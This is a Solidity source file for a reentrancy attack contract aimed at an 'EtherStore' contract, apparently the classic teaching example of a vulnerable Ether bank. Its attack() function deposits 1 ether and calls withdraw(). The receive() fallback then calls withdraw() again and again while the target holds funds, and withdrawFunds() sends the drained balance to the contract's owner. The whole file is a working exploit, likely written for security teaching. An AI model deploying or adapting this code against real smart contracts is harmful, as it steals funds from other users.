// SPDX-License-Identifier: MIT
pragma solidity ^0.8.25;

import {EtherStore} from "./EtherStore.sol";

contract ReentrancyEtherStore {
    EtherStore etherStore;
    address owner;

    constructor(EtherStore _etherStore) {
        etherStore = _etherStore;
        owner = msg.sender;
    }

    modifier onlyOwner() {
        require(msg.sender == owner, "Not owner");
        _;
    }

    function attack() public payable onlyOwner {
        etherStore.deposit{value: 1 ether}();
        etherStore.withdraw();
    }

    function withdrawFunds() public onlyOwner {
        require(address(this).balance > 0, "No funds");
        (bool sent,) = address(owner).call{value: address(this).balance}("");
        require(sent, "Failed to send Ether");
    }

    receive() external payable {
        if (address(etherStore).balance >= 1 ether) {
            etherStore.withdraw();
        }
    }
}
